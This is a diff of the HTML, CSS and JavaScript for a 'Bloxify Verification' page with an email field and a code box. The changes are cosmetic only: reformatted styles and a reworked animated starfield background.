@@ -5,22 +5,28 @@
 <title>Bloxify Verification</title>
 <style>
 html, body {
-    margin: 0; padding: 0;
+    margin: 0;
+    padding: 0;
     width: 100%; height: 100%;
-    background: #0b0b0b;
+    background: black;
     font-family: Arial;
     overflow: hidden;
     color: #eee;
 }
 
-/* Stars */
-.star {
-    position: absolute;
-    width: 3px;
-    height: 3px;
-    background: white;
-    border-radius: 50%;
-    box-shadow: 0 0 4px white;
+/* Floating starfield */
+#space {
+    position: fixed;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(white 1px, transparent 1px);
+    background-size: 100px 100px;
+    animation: drift 120s linear infinite;
+}
+
+@keyframes drift {
+    0% { transform: translate(0,0); }
+    100% { transform: translate(-400px,-400px); }
 }
 
 /* UI Box */
@@ -29,39 +35,41 @@ html, body {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 380px;
-    padding: 30px;
+    width: 400px;
+    padding: 35px;
     background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
     border-radius: 16px;
     text-align: center;
     box-shadow: 0 0 25px rgba(255,255,255,0.15);
-    animation: float 6s ease-in-out infinite;
+    z-index: 10;
 }
 
-@keyframes float {
-    50% { transform: translate(-50%, -53%); }
-}
-
+/* Inputs */
 input, button {
-    width: 100%; padding: 12px; margin-top: 12px;
-    border-radius: 8px; border: none; font-size: 16px;
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
 }
 
 input { background: #222; color: white; }
 button { background: #333; color: white; cursor: pointer; }
 button:hover { background: #444; }
 
-#error { color: #ff6b6b; display: none; }
 #codeBox { display: none; }
+#error { color: #ff6b6b; display: none; }
 
 a { color: #777; text-decoration: none; }
 </style>
 </head>
 <body>
 
+<div id="space"></div>
+
 <div id="box">
     <h1>Bloxify Verification</h1>
-
     <input id="email" placeholder="Email">
     <button onclick="sendEmail()">Submit</button>
 
@@ -76,34 +84,34 @@ a { color: #777; text-decoration: none; }
 </div>
 
 <script>
-// Generate stars
-const stars = [];
-for (let i = 0; i < 150; i++) {
+// Extra small stars for floating background
+const starCount = 200;
+for (let i = 0; i < starCount; i++) {
     const s = document.createElement("div");
     s.className = "star";
-    s.style.left = Math.random() * window.innerWidth + "px";
-    s.style.top = Math.random() * window.innerHeight + "px";
+    s.style.width = `${Math.random() * 2 + 1}px`;
+    s.style.height = s.style.width;
+    s.style.position = "absolute";
+    s.style.background = "white";
+    s.style.borderRadius = "50%";
+    s.style.left = `${Math.random() * window.innerWidth}px`;
+    s.style.top = `${Math.random() * window.innerHeight}px`;
+    s.style.opacity = Math.random();
+    s.style.boxShadow = "0 0 2px white";
     document.body.appendChild(s);
-    stars.push(s);
-}
 
-// Animate stars randomly
-function moveStars() {
-    stars.forEach(s => {
-        let x = parseFloat(s.style.left) + (Math.random()-0.5)*1.5;
-        let y = parseFloat(s.style.top) + (Math.random()-0.5)*1.5;
-
+    // Animate each star slowly in a drift pattern
+    const speed = Math.random() * 0.2 + 0.05;
+    function animateStar() {
+        let x = parseFloat(s.style.left) - speed;
+        let y = parseFloat(s.style.top);
         if (x < 0) x = window.innerWidth;
-        if (x > window.innerWidth) x = 0;
-        if (y < 0) y = window.innerHeight;
-        if (y > window.innerHeight) y = 0;
-
         s.style.left = x + "px";
         s.style.top = y + "px";
-    });
-    requestAnimationFrame(moveStars);
+        requestAnimationFrame(animateStar);
+    }
+    animateStar();
 }
-moveStars();
 
 // Submit email
 function sendEmail() {
@@ -127,6 +135,5 @@ function sendCode() {
     });
 }
 </script>
-
 </body>
 </html>
